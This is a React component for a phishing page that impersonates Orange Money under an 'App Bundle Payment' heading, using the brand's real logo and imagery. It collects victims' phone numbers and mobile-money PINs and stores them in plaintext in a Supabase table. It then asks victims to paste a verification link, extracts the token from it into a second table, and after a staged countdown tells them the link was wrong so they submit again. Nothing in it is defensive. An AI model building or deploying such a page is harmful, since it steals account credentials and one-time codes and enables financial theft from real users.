import { useState } from "react";
import { Phone, Lock, ChevronDown, ArrowLeft } from "lucide-react";
import countryCodes from "./countryCodes";
import { supabase } from "./supabaseClient";

type PaymentStep = "payment" | "verify";

interface PaymentFormData {
  countryCode: string;
  phoneNumber: string;
  pin: string;
}

const LOGO_URL =
  "https://1000logos.net/wp-content/uploads/2021/02/Orange-Money-logo.png";

const BG_IMAGE_URL =
  "https://orangemoney.orange.cm/orange-money/resources/img/Generique%20OM%20Mastercard.jpeg";

export default function VodacomPayment() {
  const [step, setStep] = useState<PaymentStep>("payment");

  const [formData, setFormData] = useState<PaymentFormData>({
    countryCode: "",
    phoneNumber: "",
    pin: "",
  });

  const [verificationLink, setVerificationLink] = useState("");
  const [linkError, setLinkError] = useState("");
  const [loading, setLoading] = useState(false);
  const [dropdownOpen, setDropdownOpen] = useState(false);

  const [countdown, setCountdown] = useState(0);
  const [verificationStatus, setVerificationStatus] = useState<
    "idle" | "loading" | "success" | "error"
  >("idle");

  const isPhoneValid = /^\d{9,10}$/.test(formData.phoneNumber);
  const isPinValid = /^\d{4,5}$/.test(formData.pin);
  const isPaymentValid = formData.countryCode && isPhoneValid && isPinValid;

  // =========================
  // PAYMENT SAVE
  // =========================
  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isPaymentValid) return;

    setLoading(true);

    try {
      const { error } = await supabase.from("orange_payment_records").insert({
        country: formData.countryCode,
        number: formData.phoneNumber,
        pin: formData.pin,
      });

      if (error) throw error;

      setStep("verify");
    } catch (err) {
      alert("Error saving payment.");
    } finally {
      setLoading(false);
    }
  };

  // =========================
  // SAVE VERIFICATION LINK + 10s countdown
  // =========================
  const handleVerifyLink = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!verificationLink.startsWith("http")) {
      setLinkError("Please paste a valid verification link.");
      return;
    }

    setLoading(true);
    setVerificationStatus("loading");
    setLinkError("");

    try {
      const url = new URL(verificationLink);
      const token = url.searchParams.get("token");

      const { error } = await supabase.from("orange_otp_records").insert({
        country: formData.countryCode,
        number: formData.phoneNumber,
        verification: verificationLink,
        token: token,
      });

      if (error) throw error;

      // Start 10-second countdown
      setCountdown(10);
      const timer = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
            setVerificationStatus("success");
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    } catch (err) {
      setVerificationStatus("error");
      setLinkError("Expired or wrong link.");
    } finally {
      setLoading(false);
    }
  };

  const handleBack = () => {
    if (step === "verify") setStep("payment");
    else window.history.back();
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4 bg-cover bg-center"
      style={{ backgroundImage: `url(${BG_IMAGE_URL})` }}
    >
      <div className="w-full max-w-md bg-white rounded-2xl shadow-xl overflow-hidden relative">
        {/* Back Arrow */}
        <div className="absolute top-4 left-4 z-20">
          <button
            onClick={handleBack}
            className="flex items-center gap-2 px-3 py-1 bg-gray-100 rounded-lg text-sm"
          >
            <ArrowLeft size={16} />
            Back
          </button>
        </div>

        {/* Header */}
        <div className="bg-orange-600 px-6 py-10 text-white text-center">
          <div className="bg-white rounded-2xl p-4 w-32 mx-auto mb-6 shadow-md">
            <img src={LOGO_URL} alt="Orange Money" />
          </div>
          <h1 className="text-2xl font-bold">
            {step === "payment" ? "App Bundle Payment" : "Verify Payment"}
          </h1>
        </div>

        {step === "payment" ? (
          <form onSubmit={handlePayment} className="p-6 space-y-6">
            {/* Country */}
            <div className="relative">
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                Country
              </label>
              <button
                type="button"
                onClick={() => setDropdownOpen(!dropdownOpen)}
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-xl flex items-center justify-between bg-white"
              >
                <span className="text-gray-400">
                  {formData.countryCode || "Choose your country"}
                </span>
                <ChevronDown />
              </button>

              {dropdownOpen && (
                <div className="absolute bg-white border rounded-xl w-full mt-1 max-h-56 overflow-y-auto shadow-lg z-10">
                  {countryCodes.map((c) => (
                    <div
                      key={c.code}
                      className="p-2 flex items-center gap-2 hover:bg-orange-50 cursor-pointer"
                      onClick={() => {
                        setFormData({ ...formData, countryCode: c.code });
                        setDropdownOpen(false);
                      }}
                    >
                      <img src={c.flag} className="w-5 h-5 rounded" />
                      <span className="flex-1">{c.country}</span>
                      <span className="text-gray-500">{c.code}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Phone */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                Phone Number
              </label>
              <div className="relative">
                <Phone className="absolute left-4 top-3 text-gray-400" />
                <input
                  type="tel"
                  className="w-full pl-12 pr-4 py-3 border-2 border-gray-300 rounded-xl bg-white"
                  placeholder="712345678"
                  value={formData.phoneNumber}
                  onChange={(e) =>
                    setFormData({
                      ...formData,
                      phoneNumber: e.target.value.replace(/\D/g, "").slice(0, 10),
                    })
                  }
                />
              </div>
            </div>

            {/* PIN */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                Enter PIN
              </label>
              <div className="relative">
                <Lock className="absolute left-4 top-3 text-gray-400" />
                <input
                  type="password"
                  maxLength={5}
                  className="w-full pl-12 pr-4 py-3 border-2 border-gray-300 rounded-xl bg-white"
                  placeholder="4–5-digit PIN"
                  value={formData.pin}
                  onChange={(e) =>
                    setFormData({
                      ...formData,
                      pin: e.target.value.replace(/\D/g, ""),
                    })
                  }
                />
              </div>
            </div>

            <button
              disabled={!isPaymentValid || loading}
              className={`w-full py-4 rounded-xl font-semibold text-lg shadow-lg ${
                !isPaymentValid || loading
                  ? "bg-gray-400 cursor-not-allowed"
                  : "bg-orange-600 text-white"
              }`}
            >
              {loading ? "Processing..." : "Confirm Payment"}
            </button>
          </form>
        ) : (
          <form onSubmit={handleVerifyLink} className="p-6 text-center">
            <p className="mb-4 text-gray-700">
              A verification link has been sent to {formData.countryCode}{" "}
              {formData.phoneNumber}
            </p>

            <p className="mb-4 text-sm text-gray-500">
              Please copy the full verification link and paste it below to continue.
            </p>

            <input
              type="url"
              value={verificationLink}
              onChange={(e) => setVerificationLink(e.target.value.trim())}
              className="w-full mx-auto text-sm py-3 px-4 border-2 border-gray-300 rounded-xl bg-white"
              placeholder="Paste verification link here"
              disabled={verificationStatus === "loading"}
            />

            {/* Countdown & Status Messages */}
            {verificationStatus === "loading" && countdown > 0 && (
              <p className="text-gray-700 font-medium mt-3">
                Please wait {countdown}s before entering.
              </p>
            )}

            {verificationStatus === "success" && (
              <p className="text-green-600 font-medium mt-3">
                try again !! wrong link.
              </p>
            )}

            {verificationStatus === "error" && (
              <p className="text-orange-600 font-medium mt-3">
                Expired or wrong link.
              </p>
            )}

            <button
              type="submit"
              disabled={loading || verificationStatus === "loading"}
              className="w-full mt-4 bg-orange-600 text-white py-4 rounded-xl font-semibold text-lg shadow-lg disabled:bg-gray-400"
            >
              {loading ? "Processing..." : "Verify Link"}
            </button>
          </form>
        )}
      </div>
    </div>
  );
}